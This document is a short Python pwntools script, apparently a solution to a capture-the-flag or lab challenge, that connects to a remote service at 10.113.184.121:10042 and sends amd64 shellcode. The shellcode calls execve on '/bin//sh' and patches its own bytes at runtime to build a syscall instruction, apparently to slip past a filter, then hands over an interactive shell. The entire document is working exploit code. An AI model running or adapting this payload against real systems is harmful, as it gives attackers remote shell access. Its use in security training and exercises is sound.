from pwn import *
context.arch = "amd64"
sc = shellcraft.sh()
# print(sc)
# print(asm(sc))
# print(disasm(asm(sc)))
# r = process("./share/lab")
r = remote("10.113.184.121", 10042)
shellcode = '''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
mov rcx, 0x040e
add rcx, 0x0101
mov qword [rip-8], rcx
push rcx
jmp rsp
syscall
'''
print(disasm(asm(shellcode)))
# pause()
r.send(asm(shellcode))
r.interactive()